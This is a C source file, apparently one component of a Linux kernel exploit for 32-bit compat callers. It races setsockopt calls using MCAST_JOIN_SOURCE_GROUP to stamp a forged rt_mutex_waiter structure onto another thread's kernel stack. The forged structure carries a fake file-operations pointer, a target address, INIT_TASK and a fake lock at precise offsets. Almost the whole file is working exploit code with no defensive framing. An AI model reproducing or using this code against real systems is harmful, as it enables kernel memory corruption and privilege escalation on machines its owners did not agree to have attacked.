/*
 * exp32 stack stamper — sprays the payload onto the waiter's kernel
 * stack via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 32-bit only (see main.c).
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;

void do_stamp_stack(uint64_t *buf){
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[260];
    uint64_t compat[8];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
    /*
     * Compat (32-bit) callers take the TIF_32BIT path in do_ipv6_setsockopt:
     * 260 bytes are copied to sp+0x48, then field-scattered into the native
     * struct at sp+0x150.  The rt_mutex_waiter slot is native+0x28, so the
     * payload must be laid out at buffer+0x3c in compat order:
     *   +0x3c tree_entry.rb_parent_color, +0x44 rb_right, +0x4c rb_left,
     *   +0x54 pi_tree.rb_parent_color/task, +0x5c lock, +0x64 prio, +0x6c deadline
     */
    compat[0] = buf[0]; /* fake_fops -> tree_entry.rb_parent_color */
    compat[1] = buf[1]; /* target    -> tree_entry.rb_right        */
    compat[2] = buf[2]; /* 0         -> tree_entry.rb_left         */
    compat[3] = buf[6]; /* INIT_TASK -> pi_tree.rb_parent_color    */
    compat[4] = buf[7]; /* fake_lock -> waiter->lock               */
    compat[5] = buf[8]; /* 0         -> waiter->prio               */
    compat[6] = buf[9]; /* 0         -> waiter->deadline           */
    compat[7] = 0;
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer+0x3c, compat, sizeof(compat));
    uint64_t times = 10000000;

    while (times--)
    {
        atomic_store(&g_consumer_go, 1);
        // racing
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer, 260);
    }
	close(fd);
}
